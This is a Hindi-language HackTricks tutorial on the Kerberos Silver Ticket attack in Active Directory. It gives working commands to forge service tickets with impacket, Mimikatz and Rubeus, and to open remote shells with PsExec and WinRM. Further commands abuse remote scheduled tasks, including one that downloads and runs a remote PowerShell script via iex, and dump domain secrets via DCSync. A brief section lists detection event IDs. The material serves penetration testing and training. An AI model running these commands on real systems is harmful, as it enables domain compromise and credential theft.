# सिल्वर टिकट

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो करें**.
* **अपनी हैकिंग ट्रिक्स साझा करें** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

यदि आप **हैकिंग करियर** में रुचि रखते हैं और अहैकेबल को हैक करना चाहते हैं - **हम भर्ती कर रहे हैं!** (_पोलिश भाषा में धाराप्रवाह लिखित और बोलचाल आवश्यक है_).

{% embed url="https://www.stmcyber.com/careers" %}

## सिल्वर टिकट

सिल्वर टिकट हमला **एक वैध TGS बनाने पर आधारित है जब सेवा का NTLM हैश मालिकाना होता है** (जैसे कि **PC अकाउंट हैश**). इस प्रकार, यह संभव है कि **किसी भी उपयोगकर्ता के रूप में** एक कस्टम TGS बनाकर **उस सेवा तक पहुंच प्राप्त की जा सके**.

इस मामले में, AD में एक उपयोगकर्ता खाते की तरह कंप्यूटर खाते का NTLM **हैश मालिकाना होता है**. इसलिए, यह संभव है कि **एक टिकट बनाई जाए** जिससे **उस मशीन में प्रवेश किया जा सके** SMB सेवा के माध्यम से **एडमिनिस्ट्रेटर** विशेषाधिकारों के साथ. कंप्यूटर खाते अपने पासवर्ड हर 30 दिनों में डिफ़ॉल्ट रूप से रीसेट करते हैं.

यह भी ध्यान में रखा जाना चाहिए कि यह संभव और **पसंदीदा** (opsec) है कि **AES Kerberos कुंजियों (AES128 और AES256) का उपयोग करके टिकट बनाए जाएं**. AES कुंजी कैसे उत्पन्न करें यह जानने के लिए पढ़ें: [MS-KILE का अनुभाग 4.4](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/936a4878-9462-4753-aac8-087cd3ca4625) या [Get-KerberosAESKey.ps1](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372).

{% code title="Linux" %}
```bash
python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
```
```markdown
Windows में, **Mimikatz** का उपयोग **ticket** बनाने के लिए किया जा सकता है। इसके बाद, **Rubeus** के साथ ticket को **inject** किया जाता है, और अंत में **PsExec** की मदद से एक दूरस्थ shell प्राप्त की जा सकती है।

{% code title="Windows" %}
```
```bash
#Create the ticket
mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"
#Inject in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt ticket.kirbi"
.\Rubeus.exe ptt /ticket:ticket.kirbi
#Obtain a shell
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd

#Example using aes key
kerberos::golden /user:Administrator /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /target:labwws02.jurassic.park /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi
```
{% endcode %}

**CIFS** सेवा वह है जो आपको **पीड़ित की फाइल सिस्टम तक पहुंचने** की अनुमति देती है। आप यहां अन्य सेवाएं देख सकते हैं: [**https://adsecurity.org/?page\_id=183**](https://adsecurity.org/?page\_id=183)**।** उदाहरण के लिए, आप **HOST सेवा** का उपयोग करके किसी कंप्यूटर में _**schtask**_ बना सकते हैं। फिर आप यह जांच सकते हैं कि यह काम कर रहा है या नहीं, पीड़ित के कार्यों की सूची बनाकर: `schtasks /S <hostname>` या आप **HOST और** **RPCSS सेवा** का उपयोग करके किसी कंप्यूटर में **WMI** क्वेरीज़ को निष्पादित कर सकते हैं, इसे परीक्षण करें: `Get-WmiObject -Class win32_operatingsystem -ComputerName <hostname>`

### उपाय

Silver ticket की घटनाओं की ID (golden ticket से अधिक गुप्त):

* 4624: खाता लॉगऑन
* 4634: खाता लॉगऑफ
* 4672: व्यवस्थापक लॉगऑन

[**Silver Tickets के बारे में अधिक जानकारी ired.team पर**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)

## उपलब्ध सेवाएं

| सेवा प्रकार                                | सेवा Silver Tickets                                                       |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>ओएस पर निर्भर करते हुए भी:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>कुछ अवसरों पर आप सिर्फ पूछ सकते हैं: WINRM</p> |
| निर्धारित कार्य                            | HOST                                                                       |
| Windows File Share, यह भी psexec            | CIFS                                                                       |
| LDAP ऑपरेशन, DCSync सहित                   | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

**Rubeus** का उपयोग करके आप इन सभी टिकटों के लिए पूछ सकते हैं पैरामीटर के साथ:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

## सेवा टिकटों का दुरुपयोग

निम्नलिखित उदाहरणों में मान लें कि टिकट प्रशासक खाते का अनुकरण करके प्राप्त की गई है।

### CIFS

इस टिकट के साथ आप **SMB** के माध्यम से `C$` और `ADMIN$` फोल्डर तक पहुंच सकते हैं (यदि वे उजागर हैं) और रिमोट फाइलसिस्टम के एक हिस्से में फाइलों की प्रतिलिपि बना सकते हैं बस ऐसा कुछ करके:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
### HOST

इस अनुमति के साथ आप दूरस्थ कंप्यूटरों में निर्धारित कार्य उत्पन्न कर सकते हैं और मनमाने आदेश निष्पादित कर सकते हैं:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

इन टिकटों के साथ आप **पीड़ित सिस्टम में WMI निष्पादित कर सकते हैं**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
निम्नलिखित पृष्ठ में **wmiexec के बारे में अधिक जानकारी** प्राप्त करें:

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

winrm के माध्यम से एक कंप्यूटर तक **पहुँच** सकते हैं और यहाँ तक कि PowerShell भी प्राप्त कर सकते हैं:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
निम्नलिखित पृष्ठ पर जाएं ताकि **winrm का उपयोग करके दूरस्थ होस्ट से जुड़ने के और तरीके सीखें**:

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
ध्यान दें कि दूरस्थ कंप्यूटर पर पहुँचने के लिए **winrm सक्रिय और सुन रहा होना चाहिए**।
{% endhint %}

### LDAP

इस विशेषाधिकार के साथ आप **DCSync** का उपयोग करके DC डेटाबेस को डंप कर सकते हैं:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSync के बारे में और जानें** निम्नलिखित पृष्ठ पर:

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

यदि आप **हैकिंग करियर** में रुचि रखते हैं और अहैकिबल को हैक करना चाहते हैं - **हम भर्ती कर रहे हैं!** (_धाराप्रवाह पोलिश लिखित और बोली जाने वाली आवश्यकता_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ शून्य से नायक तक AWS हैकिंग सीखें</strong>!</summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** का अनुसरण करें.**
* **HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>
